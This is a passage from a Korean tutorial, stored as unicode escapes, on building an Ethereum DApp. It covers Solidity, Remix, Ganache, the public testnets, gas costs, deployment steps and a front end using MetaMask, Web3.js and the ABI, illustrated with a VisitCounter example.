\uc218 \uc788\uc74c.Back-end:Solidity\uc774\ub354\ub9ac\uc6c0\uc758 \uc2a4\ub9c8\ud2b8 \ucee8\ud2b8\ub799\ud2b8\ub97c \uc791\uc131\ud560 \uc218 \uc788\ub294 \uac1d\uccb4\uc9c0\ud5a5\ud615 \ud504\ub85c\uadf8\ub798\ubc0d \uc5b8\uc5b4Remix IDE\uc194\ub9ac\ub514\ud2f0 \ucf54\ub4dc\ub97c \uc791\uc131\ud558\uace0 \ucef4\ud30c\uc77c \ubc0f \ubc30\ud3ec\uae4c\uc9c0 \uc27d\uac8c \uc790\ub3d9\uc73c\ub85c \ud560 \uc218 \uc788\ub3c4\ub85d \ub3d5\ub294 \uc628\ub77c\uc778 \ucef4\ud30c\uc77c\ub7ec \ud234. \ub514\ubc84\uae45 \ud234\ub85c\ub3c4 \ub9ce\uc774 \uc4f0\uc784.\uc6d0\ub798\ub294 \ub85c\uceec \ucef4\ud4e8\ud130\uc5d0 \uc9c1\uc811 \uc194\ub9ac\ub514\ud2f0 \ucef4\ud30c\uc77c\ub7ec\ub97c \uc124\uce58\ud574\uc57c\ud558\ub294\ub370, \ub9ac\ubbf9\uc2a4 \uc6f9\ube0c\ub77c\uc6b0\uc800\ub97c \uc0ac\uc6a9\ud558\uba74 \uadf8\ub7f0 \uacfc\uc815\uc5c6\uc774 \uc27d\uace0 \ube60\ub974\uac8c \ucef4\ud30c\uc77c \ubc0f \ubc30\ud3ec\uac00 \uac00\ub2a5TestRPC(\ud604\uc7ac Ganache\ub85c \uc5c5\ub370\uc774\ud2b8\ub428)\uac1c\ubc1c \ub2e8\uacc4\uc5d0\uc11c \uc2e4\uc81c \uc774\ub354\uc5c6\uc774 \uc2dc\ubbac\ub808\uc774\uc158 \ud14c\uc2a4\ud2b8 \ud658\uacbd\uc744 \uad6c\uc131\ud560 \uc218 \uc788\uac8c \ud574\uc8fc\ub294 \ud234. \uc6d0\ub798 \uc774\ub354\ub9ac\uc6c0 \uba54\uc778\ub137\uc5d0\uc11c \ud14c\uc2a4\ud2b8\ub97c \ud558\ub824\uba74 \uc2e4\uc81c \uc774\ub354\uac00 \ud544\uc694\ud558\uc9c0\ub9cc, TestRPC \ub97c \uc0ac\uc6a9\ud558\uba74 \ub9c8\uc774\ub2dd \uc5c6\uc774 \uac00\uc0c1\ud658\uacbd\uc5d0\uc11c \ub9ac\uc18c\uc2a4, \ud2b8\ub79c\uc7ad\uc158\uc5d0 \ub300\ud55c \uc81c\ud55c \uc5c6\uc774 \uc774\ub354\ub9ac\uc6c0\uc744 \ub9cc\ub4e4\uc5b4\ub0b4\uc11c \ud14c\uc2a4\ud2b8\ub97c \ud560 \uc218 \uc788\uc74c.TestNet\uc774\ub354\ub9ac\uc6c0\uc758 \ud37c\ube14\ub9ad \ud14c\uc2a4\ud2b8 \ub124\ud2b8\uc6cc\ud06c. \ud604\uc7ac \uc544\ub798\uc640 \uac19\uc740 3\uac1c\uc758 \ud37c\ube14\ub9ad \ud14c\uc2a4\ud2b8\ub137\uc744 \uc81c\uacf5.Ropsten (Proof of Work): \ud504\ub85c\ub355\uc158 \ud658\uacbd\uc774 \uc2e4\uc81c \uba54\uc778\ub137\uc774\ub791 \uac00\uc7a5 \ube44\uc2b7\ud558\uc5ec (PoW \uc774\uae30 \ub54c\ubb38\uc5d0) \ud604\uc7ac \uac00\uc7a5 \ub9ce\uc774 \uc4f0\uc5ec\uc9c0\uace0 \uc788\ub294 \ud14c\uc2a4\ud2b8 \ub124\ud2b8\uc6cc\ud06c. Geth \uc640 Parity \ud074\ub77c\uc774\uc5b8\ub4dc \ub458\ub2e4 \uc9c0\uc6d0. \uc774\uc804\uc5d0 \uc2a4\ud338 \uc5b4\ud0dd\uc744 \ub2f9\ud55c \uc774\ub825\uc774 \uc788\uc74c\u2026 \uc774\ub354 \ub9c8\uc774\ub2dd\uc774 \uac00\ub2a5\ud558\uba70, \ud14c\uc2a4\ud2b8 \uc774\ub354\ub97c \uc694\uccad\ud560 \uc218 \uc788\ub2e4.Kovan (Proof of Authority): Parity \ud300\uc774 \ub78d\uc2a4\ud150\uc758 \ubb38\uc81c\ub97c \ud574\uacb0\ud558\uae30 \uc704\ud574 \uac1c\ubc1c\ud55c \ud14c\uc2a4\ud2b8 \ub124\ud2b8\uc6cc\ud06c. \uc2a4\ud338\uc5b4\ud0dd\uc73c\ub85c\ubd80\ud130 \uc548\uc804\ud558\uba70, Parity \ud074\ub77c\uc774\uc5b8\ud2b8\ub9cc \uc9c0\uc6d0. \uc774\ub354 \ub9c8\uc774\ub2dd \ubd88\uac00\ub2a5\ud558\uba70, \ud14c\uc2a4\ud2b8 \uc774\ub354 \uc694\uccad \ud544\uc694.Rinkeby (Proof of Authority): Rinkeby \uc5ed\uc2dc \uc2a4\ud338 \uc5b4\ud0dd\uc744 \ubc29\uc9c0\ud558\uace0\uc790 \ub9cc\ub4e4\uc5b4\uc84c\uc73c\uba70, \uc774\ub354\ub9ac\uc6c0 \ud300\uc774 \uac1c\ubc1c\ud55c \ud14c\uc2a4\ud2b8\ub137. Geth \ud074\ub77c\uc774\uc5b8\ud2b8\ub9cc \uc9c0\uc6d0. \uc774\ub354 \ub9c8\uc774\ub2dd \ubd88\uac00\ub2a5\ud558\uba70, \ud14c\uc2a4\ud2b8 \uc774\ub354 \uc694\uccad \uac00\ub2a5.Mainnet\uc2e4\uc81c \uac70\ub798\uac00 \uc774\ub8e8\uc5b4\uc9c0\ub294 \uc774\ub354\ub9ac\uc6c0\uc758 \uba54\uc778 \ub124\ud2b8\uc6cc\ud06c.Part2. \uac1c\ubc1c\ubd80\ud130 \ubc30\ud3ec\uae4c\uc9c0A. Solidity\ub85c \uc2a4\ub9c8\ud2b8 \ucee8\ud2b8\ub799\ud2b8 \ub9cc\ub4e4\uae30\uc194\ub9ac\ub514\ud2f0\uc5d0\ub294 \uae30\uc874\uc758 \ub2e4\ub978 \uc5b8\uc5b4\ub4e4\uacfc\ub294 \ub2e4\ub978 \ud2b9\uc9d5\ub4e4\uc774 \ub9ce\uc2b5\ub2c8\ub2e4. \u201c\uc624, \uc774\ub7f0 \uac83\ub3c4 \ub418\ub124?\u201d\ub77c\uace0 \uc0dd\uac01\ud560 \uc218 \uc788\ub294 \uc694\uc18c\ub4e4\ub3c4 \uc788\uc9c0\ub9cc, \ubc18\ub300\ub85c \u201c\uc544\ub2c8, \uc774\ub7f0 \uac83\ub3c4 \uc548\ub3fc?\u201d\ub77c\uace0 \uc0dd\uac01\ud560 \ubc95\ud55c \uac83\ub4e4\ub3c4 \ub9ce\uc2b5\ub2c8\ub2e4\u2026(\uc9c4\uc9dc\ub85c\u2026). \uadf8\ub807\uae30 \ub54c\ubb38\uc5d0 \uac04\ub2e8\ud55c DApp\uc774\ub77c\ub3c4 \uc9c1\uc811 \ub9cc\ub4e4\uc5b4 \ubc30\ud3ec\ud574\ubcf4\ub294 \uac83\uc774 \uc815\ub9d0 \uc911\uc694\ud569\ub2c8\ub2e4. \uadf8 \uacfc\uc815\uc5d0\uc11c \ubc30\uc6b8 \uc218 \uc788\ub294 \uac83\ub4e4\uc774 \ub9e4\uc6b0 \ub9ce\uc2b5\ub2c8\ub2e4.\uc5ec\uae30\uc11c\ub294 \uc800\ud76c\uac00 Github\uc5d0 \uc62c\ub824\ub193\uc740 VisitCounter DApp\uc744 \ubd84\uc11d\ud558\uba70 \uc194\ub9ac\ub514\ud2f0\uc758 \ud2b9\uc9d5\ub4e4\uc744 \ud568\uaed8 \uc54c\uc544\ubcf4\uaca0\uc2b5\ub2c8\ub2e4.VisitCounter\uc758 \uc804\uccb4 \uc18c\uc2a4 \ucf54\ub4dc\ub294 \uc774 Github \uc800\uc7a5\uc18c\uc5d0 \uc62c\ub77c\uac00 \uc788\uc2b5\ub2c8\ub2e4.\uc774\ub984\uc5d0\uc11c \uc54c \uc218 \uc788\ub4ef\uc774, \ud574\ub2f9 \ud504\ub85c\uc81d\ud2b8\uc5d0\uc11c\ub294 \uc6b0\ub9ac DApp\uc5d0 \ucd1d \uba87 \uba85\uc774 \ubc29\ubb38\ud588\ub294\uc9c0, \ub610 \ub204\uac00 \uba87 \ubc88\uc744 \ubc29\ubb38\ud588\ub294\uc9c0 \uae30\ub85d\ud569\ub2c8\ub2e4.\ud558.\uc9c0.\ub9cc\u2026 \uadf8 \uc804\uc5d0 \uba3c\uc800 \uc720\uc758\ud558\uc154\uc57c \ud560 \uac83\uc774 \uc788\uc2b5\ub2c8\ub2e4..! \uc774\ub354\ub9ac\uc6c0\uc758 DApp\uc5d0\uc11c \ube14\ub85d\uccb4\uc778\uc5d0 \ubb54\uac00\ub97c \uae30\ub85d\ud558\ub824 \ud55c\ub2e4\uba74, \u2018\uac00\uc2a4(Gas)\u2019\ub77c\uace0 \ubd88\ub9ac\ub294 \uc77c\uc885\uc758 \ucc98\ub9ac(Transaction) \uc218\uc218\ub8cc\ub97c \uc9c0\ubd88\ud574\uc57c \ud569\ub2c8\ub2e4. \uc774\ub294 \uacb0\uad6d \uc0ac\uc6a9\uc790\uac00 \uc774\ub354\ub97c \uc9c0\ubd88\ud574\uc57c \ud55c\ub2e4\ub294 \uac83\uc774\uc8e0. \uadf8\ub9ac\uace0 \uc774\ub354\ub294 \ubb50\uc8e0? \uc0ac\uc6a9\uc790\uac00 \uac70\ub798\uc18c \ub4f1\uc5d0\uc11c \uc2e4\uc81c \ud604\uae08\uc744 \uc8fc\uace0 \uad6c\uc785\ud574\uc57c \ud558\ub294, \uc9c4\uc9dc \ub3c8\uc785\ub2c8\ub2e4.\uc774\ubc88 \uae00 \ud558\ub098\uc5d0\uc11c \uc774\ub354\ub9ac\uc6c0\uacfc \uc194\ub9ac\ub514\ud2f0\uc758 \ubaa8\ub4e0 \uac1c\ub150\uc744 \uba85\ud655\ud558\uac8c \ubaa8\ub450 \uc124\uba85\ud558\uae30\ub294 \ud798\ub4e4\uc9c0\ub9cc, \uc774\uac70 \ud558\ub098\ub9cc \uae30\uc5b5\ud558\uc2dc\uba74 \ub429\ub2c8\ub2e4.\u201c\uc774\ub354\ub9ac\uc6c0\uc5d0\uc11c DApp\uc744 \uc0ac\uc6a9\ud558\ub824\uba74 \ub3c8\uc744 \ub0b4\uc57c \ud55c\ub2e4!\u201d\uc989, \uc6b0\ub9ac\uac00 \uc608\uc2dc\ub85c \ubcfc VisitCounter\ub294 \ub300\ubd80\ubd84\uc758 \uc0ac\uc6a9\uc790 \uc785\uc7a5\uc5d0\uc11c\ub294 \uc544\ubb34\ub7f0 \uac00\uce58\uac00 \uc5c6\uc744 \uac83\uc774\uae30 \ub54c\ubb38\uc5d0\u2026 \uc544\ubb34\ub3c4 \uc6b0\ub9ac DApp\uc5d0 \ubc29\ubb38\ud558\uc9c0 \uc54a\uc744 \uac70\uc5d0\uc694\u2026 \uadf8\ub807\uc9c0\ub9cc \uacf5\ubd80\ud558\ub294 \uc785\uc7a5\uc5d0\uc11c\ub294 \uad49\uc7a5\ud788 \uc801\uc808\ud55c \ud504\ub85c\uc81d\ud2b8\uc785\ub2c8\ub2e4!\uc65c \uadf8\ub7f0\uc9c0\ub294 \ub2e4\uc74c\uc5d0 \uc4f8 \uae00\uc5d0\uc11c \uc0c1\uc138\ud788 \uc54c\uc544\ubcf4\ub3c4\ub85d \ud558\uace0(\uc124\uba85\ud560 \uac83\uc774 \uc0dd\uac01\ubcf4\ub2e4 \ub9ce\uc544\uc11c \ub2e4\ub978 \uae00\ub85c\u2026), \uc6b0\uc120 \uc774 \ud30c\uc77c\uc744 \uc2ac\uca4d \ubcf4\uace0 \uc624\uc138\uc694! \uc9c0\uae08\uc740 \uc774\ud574\ud560 \uc218 \uc5c6\ub294 \uac83\ub4e4\uc774 \uc788\ub354\ub77c\ub3c4, \u201c\ub300\ucda9 \uc774\ub807\uac8c \uc0dd\uacbc\uad6c\ub098\u201d \uc815\ub3c4\ub85c\ub9cc \uac10\uc744 \uc7a1\uc73c\uc2dc\uba74 \ub429\ub2c8\ub2e4.B. \ud14c\uc2a4\ud2b8\ub137 \ubc30\ud3ec\uc704\uc5d0\uc11c \uc194\ub9ac\ub514\ud2f0 \ucf54\ub4dc\ub97c \uc791\uc131\ud55c \ud6c4\uc5d0\ub294, \ubb34\uc5c7\uc744 \ud574\uc57c \ud560\uae4c\uc694?\uc77c\ubc18\uc801\uc778 \uc6f9 \ud504\ub85c\uadf8\ub798\ubc0d \uae30\uc900\uc73c\ub85c \ubcf4\uba74, \uc11c\ubc84\uc0ac\uc774\ub4dc \ucf54\ub4dc\ub97c \uc791\uc131\ud55c \ud6c4\uc5d0 \uc11c\ubc84\uc5d0 \ucf54\ub4dc\ub97c \uc5c5\ub85c\ub4dc\ud574\uc57c \ud558\uaca0\uc8e0.\ucef4\ud30c\uc77c\uc774 \ud544\uc694\ud55c \uacbd\uc6b0\uc5d0\ub294 \ucef4\ud30c\uc77c \ud6c4 \uc0dd\uc131\ub41c \ubc14\uc774\ub108\ub9ac \ud30c\uc77c \ub4f1 \uc2e4\ud589 \uac00\ub2a5\ud55c \ud615\ud0dc\uc758 \ud30c\uc77c\uc744 \uc5c5\ub85c\ub4dc\ud558\uc5ec \ubc30\ud3ec\ub97c \ud574\uc57c \ud560 \uac83\uc785\ub2c8\ub2e4.\uadf8\ub807\ub2e4\uba74 \uc194\ub9ac\ub514\ud2f0\uc758 \uacbd\uc6b0\uc5d0\ub3c4 \ucf54\ub4dc \uc791\uc131 \ud6c4 \uc704\uc640 \uac19\uc774 \ubc30\ud3ec\ub97c \ud558\ub294 \uacfc\uc815\uc774 \ud544\uc694\ud558\uaca0\uc8e0!? \ud558\uc9c0\ub9cc \uc5ec\uae30\uc5d0\uc11c\ub3c4 \uc77c\ubc18\uc801\uc778 \uc11c\ubc84\uc0ac\uc774\ub4dc \ucf54\ub4dc \ubc30\ud3ec\uc640\ub294 \ub2e4\ub974\uac8c, \ube14\ub85d\uccb4\uc778\uc758 \ud2b9\uc131 \ub54c\ubb38\uc5d0 \uc870\uae08\uc740 \uc0c8\ub85c\uc6b4 \ubc29\uc2dd\uc758 \ud14c\uc2a4\ud2b8\uc640 \ubc30\ud3ec\uac00 \ud544\uc694\ud569\ub2c8\ub2e4. \uc774 \ubd80\ubd84\uc5d0\uc11c \uba85\uc2ec\ud558\uc154\uc57c \ud560 \uac83\uc740\u2026\u201c\uc774\ub354\ub9ac\uc6c0 \ube14\ub85d\uccb4\uc778\uc5d0 \ubc30\ud3ec\ud55c \ucee8\ud2b8\ub799\ud2b8\ub294 \uc9c0\uc6b8 \uc218 \uc5c6\ub2e4. \uc989 \ud55c \ubc88 \ubc30\ud3ec\ud558\uba74 \uc774\ub354\ub9ac\uc6c0\uc774 \uc720\uc9c0\ub418\ub294 \ud55c, \uacc4\uc18d \uc874\uc7ac\ud55c\ub2e4.\u201d\ub2e4\uc2dc \ub9d0\ud558\uc790\uba74, \ubcf4\ud1b5\uc758 \uc11c\ubc84\uc0ac\uc774\ub4dc \ud504\ub85c\uadf8\ub7a8\ucc98\ub7fc \uac1c\ubc1c\uc790\uac00 \ub9c8\uc74c\ub300\ub85c \uc774\ubbf8 \ubc30\ud3ec\ud55c \ucf54\ub4dc\ub97c \uc11c\ubc84\uc5d0\uc11c \uc9c0\uc6b4\ub2e4\uac70\ub098 \uc811\uadfc\ud558\uc9c0 \ubabb\ud558\ub3c4\ub85d \ub9c9\uc744 \uc218 \uc5c6\ub2e4\ub294 \uac83\uc785\ub2c8\ub2e4. \ubc14\ub85c \u201c\ubd84\uc0b0 \uc560\ud50c\ub9ac\ucf00\uc774\uc158\u201d\uc774\uae30 \ub54c\ubb38\uc5d0, \ub0b4 \ucef4\ud4e8\ud130\uc5d0\uc11c \uc9c0\uc6e0\ub2e4\uace0 \ub2e4\ub978 \uc0ac\ub78c\ub4e4 \ucef4\ud4e8\ud130\uc5d0\uc11c\ub3c4 \uc9c0\uc6cc\uc9c0\ub294 \uac83\uc740 \uc544\ub2c8\uae30 \ub54c\ubb38\uc774\uc8e0. \uc644\uc804\ud788 \uac19\uc9c4 \uc54a\uc9c0\ub9cc, \uc774\uc640 \uc720\uc0ac\ud55c \uad6c\uc870\ub85c\ub294 \ud1a0\ub80c\ud2b8 \uac19\uc740 \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc774 \uc788\uaca0\uc2b5\ub2c8\ub2e4.\uc774 \ud2b9\uc131\uc73c\ub85c \uc778\ud574 \uc77c\ubc18\uc801\uc73c\ub85c \ub2e4\uc74c\uacfc \uac19\uc740 \uc808\ucc28\ub97c \uac70\uccd0 \uc774\ub354\ub9ac\uc6c0 \uba54\uc778\ub137\uc5d0 \ucee8\ud2b8\ub799\ud2b8\ub97c \ubc30\ud3ec\ud569\ub2c8\ub2e4.1. Testrpc(Ganache)\uc640 \uac19\uc740 \uac00\uc0c1 \ud658\uacbd\uc5d0\uc11c \uc194\ub9ac\ub514\ud2f0 \ucee8\ud2b8\ub799\ud2b8 \ud14c\uc2a4\ud2b8\uac00\uc0c1 \ud658\uacbd\uc740 \uc2e4\uc81c \ube14\ub85d\uccb4\uc778\uc774 \uc544\ub2c8\uba70, \ucc44\uad74 \uc5c6\uc774\ub3c4 \ub9c8\uc74c\ub300\ub85c \uc774\ub354\ub97c \ubc1c\uae09\ud558\uace0 \ucee8\ud2b8\ub799\ud2b8\ub97c \ubc30\ud3ec\ud55c \ud6c4 \uc9c0\uc6b0\ub294 \ub4f1\uc774 \uac00\ub2a5\ud5682. \ud14c\uc2a4\ud2b8\ub137\uc5d0 \ubc30\ud3ec\uc2e4\uc81c \ube14\ub85d\uccb4\uc778\uc774\uc5b4\uc11c \ucc44\uad74\uc744 \ud1b5\ud574 \uc774\ub354\ub97c \uc0dd\uc131\ud574\uc57c \ud558\uc9c0\ub9cc, \ucc44\uad74 \ub09c\uc774\ub3c4\uac00 \ub9e4\uc6b0 \ub0ae\uc74c. \ub2e4\uc591\ud55c \uc885\ub958\uc758 \ud14c\uc2a4\ud2b8\ub137\uc774 \uc788\uc73c\uba70, \ubb3c\ub860 \ud14c\uc2a4\ud2b8\ub137\uc5d0\uc11c \ubc1b\uc740 \uc774\ub354\ub294 \uc2e4\uc81c \uc774\ub354\ub9ac\uc6c0 \uba54\uc778\ub137\uc5d0\uc11c\ub294 \uc0ac\uc6a9\ud560 \uc218 \uc5c6\uc74c3. \uc774\ub354\ub9ac\uc6c0 \uba54\uc778\ub137\uc5d0 \ubc30\ud3ec\ucee8\ud2b8\ub799\ud2b8 \uc0dd\uc131 \ub4f1 \ubaa8\ub4e0 \ud2b8\ub79c\uc7ad\uc158\uc774 \ubc1c\uc0dd\ud560 \ub54c\ub9c8\ub2e4 \uac00\uc2a4\ub97c \uc18c\ubaa8\ud574\uc57c \ud568. \uc989, \uc2e4\uc81c \uc774\ub354\ub97c \uc9c0\ubd88\ud568.\uc774\ub7f0 \ubc30\ud3ec \uacfc\uc815\ub3c4 \uac04\ub2e8\ud558\uc9c0\ub9cc\uc740 \uc54a\uae30\uc5d0, \ud574\ub2f9 \ub0b4\uc6a9\uc73c\ub85c \ubcc4\ub3c4\uc758 \uae00\uc744 \uc791\uc131\ud558\uc5ec \ub204\uad6c\ub4e0 \uc774\ud574\ud558\uae30 \uc27d\uac8c \uc124\uba85\ud560 \uc608\uc815\uc785\ub2c8\ub2e4.C. Front-end \ub9cc\ub4e4\uae30\uc194\ub9ac\ub514\ud2f0\ub85c \ube14\ub85d\uccb4\uc778\uc5d0 \uc62c\ub77c\uac08 \ucee8\ud2b8\ub799\ud2b8 \ucf54\ub4dc\ub97c \uc791\uc131\ud558\uace0, TestRPC\ub098 \ud14c\uc2a4\ud2b8\ub137\uc5d0 \uc6b0\ub9ac\uc758 \ucee8\ud2b8\ub799\ud2b8\ub97c \ubc30\ud3ec\ud558\uace0 \ub098\uba74, \ubb34\uc5c7\uc744 \ud574\uc57c \ud560\uae4c\uc694?\uae30\uc874 \uc6f9\uc758 \uac1c\ub150\uc73c\ub85c \ubcf4\uc790\uba74, \uc9c0\uae08\uae4c\uc9c0 \ud55c \uac83\ub4e4\uc740 \ub9d0\ud558\uc790\uba74 \uc11c\ubc84\uc758 API\ub9cc \ub9cc\ub4e4\uc5b4\ub193\uc740 \uc0c1\ud0dc\uc778 \uac83\uc785\ub2c8\ub2e4. \uc6b0\ub9ac DApp\uc758 \uc0ac\uc6a9\uc790\ub4e4\uc774 \uc9c1\uc811 \ubcf4\uace0 \uc0ac\uc6a9\ud560, \uc55e\ub2e8\uc758 \ud074\ub77c\uc774\uc5b8\ud2b8\uac00 \uc5c6\ub294 \uc0c1\ud0dc\uc785\ub2c8\ub2e4.\ud558\uc9c0\ub9cc, \ud06c\ub86c \ube0c\ub77c\uc6b0\uc800\uc5d0 \uc5f0\uacb0\ud558\uc5ec \uc0ac\uc6a9\ud560 \uc218 \uc788\ub294 \uc77c\uc885\uc758 \uc9c0\uac11\uc778 \uba54\ud0c0\ub9c8\uc2a4\ud06c\ub97c \uc0ac\uc6a9\ud558\uba74, \ud06c\ub86c\uc5d0\uc11c \ud070 \ubc88\uac70\ub85c\uc6c0 \uc5c6\uc774 \uc77c\ubc18\uc801\uc778 \uc6f9\uc0ac\uc774\ud2b8\ub97c \uc774\uc6a9\ud558\ub4ef DApp\uc744 \uc4f8 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc989, \uc6f9\uc0ac\uc774\ud2b8\ub97c \ub9cc\ub4e4 \ub54c \uc0ac\uc6a9\ud558\ub294 HTML, CSS, Javascript\uc758 \uc870\ud569\uc73c\ub85c DApp\uc744 \uc774\uc6a9\ud560 \uc218 \uc788\ub294 \ud074\ub77c\uc774\uc5b8\ud2b8\ub97c \ub9cc\ub4e4 \uc218 \uc788\ub294 \uac83\uc774\uc8e0.\uc989, \uc6f9 \ud504\ub85c\uadf8\ub798\ubc0d \uacbd\ud5d8\uc774 \uc5b4\ub290 \uc815\ub3c4 \uc788\uc73c\uc2e0 \ubd84\ub4e4\uc740 \ud070 \ubd80\ub2f4 \uc5c6\uc774 \ubc14\ub85c \ub530\ub77c\ud558\uc2e4 \uc218 \uc788\uc2b5\ub2c8\ub2e4! =)VisitCounter\uc758 \uc800\uc7a5\uc18c\uc5d0 \uc788\ub294 frontend \ub514\ub809\ud1a0\ub9ac\ub97c \ubcf4\uc2dc\uba74, \ud558\ub098\uc758 \ub514\ub809\ud1a0\ub9ac\uc640 \ud558\ub098\uc758 html \ud30c\uc77c\uc744 \ubcf4\uc2e4 \uc218 \uc788\uc744 \uac81\ub2c8\ub2e4. \uc65c \uc774\ub7f0 \uad6c\uc131\uc778\uc9c0\ub294 \ub354 \uc0c1\uc138\ud788 \ub2e4\ub8f0 \ub2e4\ub978 \uae00\uc5d0\uc11c \ubcf4\ub3c4\ub85d \ud558\uace0\u2026 \uc5ec\uae30\uc11c\ub294 html \ud30c\uc77c\uc758 \ub0b4\uc6a9\uc744 \uc2ac\uca4d \uac00\ubccd\uac8c \ubcf4\ub3c4\ub85d \ud558\uaca0\uc2b5\ub2c8\ub2e4.\uc74c\u2026 \ud615\ud0dc\ub294 \uc5b4\ub514\uc11c \ub9ce\uc774 \ubcf8 \ud615\ud0dc\uc774\uae34 \ud55c\ub370, \ubb54\uac00 \ub0af\uc120 \uc544\uc774\ub4e4\uc774 \uc870\uae08\uc529 \uc788\uc8e0?(\ud615\ud0dc \uc790\uccb4\uac00 \ub0af\uc124\ub2e4\uba74, \uc694\ub7f0 \uc0ac\uc774\ud2b8\ub098 \uc694\ub7f0 \uc0ac\uc774\ud2b8\uc5d0\uc11c HTML, Javascript\ub97c \uba3c\uc800 \ubc30\uc6cc\ubcf4\uc138\uc694!)1. Web3\uc815\ud655\ud788 \ubb54\uc9c0\ub294 \ubaa8\ub974\uaca0\uc9c0\ub9cc, \ubb54\uac00 \uc774 web3\ub77c\ub294 \uac83\uc774 \uc55e\ubd80\ubd84\uc5d0 \uad49\uc7a5\ud788 \ub9ce\uc774 \ubcf4\uc774\uc8e0? \uc774\uac8c \uc6b0\ub9ac\uc758 \uba38\ub9ac\ub97c \ubcf5\uc7a1\ud558\uac8c \ud558\ub294 \uc6d0\uc778\uc778 \uac83 \uac19\uae30\ub3c4 \ud558\uace0\u2026. \uc774 web3\uac00 \ubb58\uae4c\uc694?Web3\ub294 \uc6b0\ub9ac\uac00 \uc774\ub354\ub9ac\uc6c0 \ube14\ub85d\uccb4\uc778\uacfc \ud1b5\uc2e0\ud560 \uc218 \uc788\ub3c4\ub85d \ud574\uc8fc\ub294 API\uc758 \uc9d1\ud569\uccb4\ub77c\uace0 \ubcf4\uc2dc\uba74 \ub429\ub2c8\ub2e4. \uc989, \uc6b0\ub9ac\uc758 \ucee8\ud2b8\ub799\ud2b8\uc640 \ub370\uc774\ud130\ub97c \uc8fc\uace0 \ubc1b\uc744 \uc218 \uc788\ub3c4\ub85d \uc815\ud574\uc9c4 \uaddc\uc57d\ub300\ub85c \uba54\uc2dc\uc9c0\ub97c \ub9cc\ub4e4\uc5b4\uc8fc\ub294 \uc5ed\ud560\uc744 \ud569\ub2c8\ub2e4. \uc6b0\ub9ac\ub294 \uc790\ubc14\uc2a4\ud06c\ub9bd\ud2b8\ub85c \ub9cc\ub4e4\uc5b4\uc9c4 Web3\ub97c \uc0ac\uc6a9\ud574\uc57c \ud558\ub2c8, \uc815\ud655\ud788\ub294 Web3.js\ub97c \uc0ac\uc6a9\ud558\ub294 \uac81\ub2c8\ub2e4.\uc2e4\uc81c\ub85c\ub294 \ud6e8\uc52c \ub354 \ubcf5\uc7a1\ud55c \ub85c\uc9c1\uc744 Web3 \ub355\uc5d0 \uc27d\uac8c \uc0ac\uc6a9\ud560 \uc218 \uc788\uac8c \ub41c \uac83\uc774\uc9c0\ub9cc, \uc544\ubb34\ub798\ub3c4 \uc0c8\ub85c\uc6b4 \uac1c\ub150\uc774 \ub9ce\ub2e4 \ubcf4\ub2c8 \uc6b0\ub9ac\uc5d0\uac90 \uadf8\uc800 \ubcf5\uc7a1\ud558\uac8c\ub9cc \ubcf4\uc77c \uc218\ubc16\uc5d0 \uc5c6\uaca0\uc8e0? \uc9c0\uae08 \ub2f9\uc7a5\uc740 \ub108\ubb34 \uc5b4\ub835\uac8c \uc0dd\uac01\ud558\uc9c0 \ub9c8\uc2dc\uace0, \u2018\uc544, \uc774\ub354\ub9ac\uc6c0 DApp\uc758 \uc6f9 \ud074\ub77c\uc774\uc5b8\ud2b8\ub97c \ub9cc\ub4e4 \ub54c\ub294 Web3.js\ub97c \uc368\uc57c\uaca0\uad6c\ub098\u2019\ud558\ub294 \uc815\ub3c4\ub85c \uae30\uc5b5\ud574\ub450\uc2dc\uba74 \ub429\ub2c8\ub2e4.Web3\uc5d0\uc11c \uc81c\uacf5\ud558\ub294 \uae30\ub2a5\uc740 \uad49\uc7a5\ud788 \ub2e4\uc591\ud55c\ub370, \ub2e8\uc21c\ud788 \ucee8\ud2b8\ub799\ud2b8\uc758 \ud568\uc218\ub97c \ud638\ucd9c\ud558\uac70\ub098 \uac12\uc744 \ubc1b\uc544\uc624\ub294 \uac83 \uc678\uc5d0\ub3c4, watch \uae30\ub2a5\uc744 \uc368\uc11c \ub0b4 \uc9c0\uac11\uc5d0 \ud2b9\uc815 \uc774\ubca4\ud2b8\uac00 \ubc1c\uc0dd\ud558\uba74 \uc77c\uc815\ud55c \ub85c\uc9c1\uc744 \uc2e4\ud589\ud558\ub3c4\ub85d \ud558\ub294 \ub4f1\uc758 \ucc98\ub9ac\ub3c4 \uac00\ub2a5\ud569\ub2c8\ub2e4. \uc774\ub7f0 \uc138\ubd80\uc801\uc778 \ub0b4\uc6a9\uc5d0 \ub300\ud574\uc11c\ub294 \uc18c\uc2a4\ub97c \ub354 \uc0c1\uc138\ud788 \ubd84\uc11d\ud560, \uc55e\uc73c\ub85c \uc4f8 \uae00\uc5d0\uc11c \ub354 \uc54c\uc544\ubcf4\ub3c4\ub85d \ud558\uaca0\uc2b5\ub2c8\ub2e4.2. ABI(Application Binary Interface)HTML \uc18c\uc2a4 \uc911\uac04\uc5d0 \ubcf4\uc2dc\uba74, \uc704\uc640 \uac19\uc740 \ubb54\uc9c0 \ubab0\ub77c\ub3c4 \uc774\uc0c1\ud558\uac8c \uc0dd\uae34 JSON \ud3ec\ub9f7\uc758 \ub370\uc774\ud130\ub97c \ubcf4\uc2e4 \uc218 \uc788\uc744 \uac81\ub2c8\ub2e4. \uadf8 \ub0b4\uc6a9\uc744 \uc870\uae08 \uc0b4\ud3b4\ubcf4\uc2dc\uba74, \ubb54\uac00 \ub9c9 \ub5a0\uc624\ub974\uc9c0 \uc54a\uc73c\uc2dc\ub098\uc694?\ub9de\uc2b5\ub2c8\ub2e4, \ubc14\ub85c VisitCounter\uc758 \uc194\ub9ac\ub514\ud2f0 \ucf54\ub4dc\uc5d0\uc11c \ubcf8 \uc778\ud130\ud398\uc774\uc2a4\uc640 \ube44\uc2b7\ud55c \ub0b4\uc6a9\uc744 \uac00\uc9c0\uace0 \uc788\uc9c0\uc694. \uc6b0\ub9ac\uac00 \uc9c0\uae08 \ubcf4\uace0 \uc788\ub294 \ud074\ub77c\uc774\uc5b8\ud2b8\ub2e8\uc5d0\uc11c\ub294 \uc194\ub9ac\ub514\ud2f0\ub85c \ub9cc\ub4e4\uc5b4\uc9c4 \ucf54\ub4dc\uac00 \uc5b4\ub5a4 \ud615\ud0dc\uc778\uc9c0\ub97c \uc54c \uc218\uac00 \uc5c6\uae30 \ub54c\ubb38\uc5d0, \u2018\ub108\uac00 \uc9c0\uae08 \ud1b5\uc2e0\ud560 \ub300\uc0c1\uc740 \uc774\ub7ec\uc774\ub7ec\ud55c 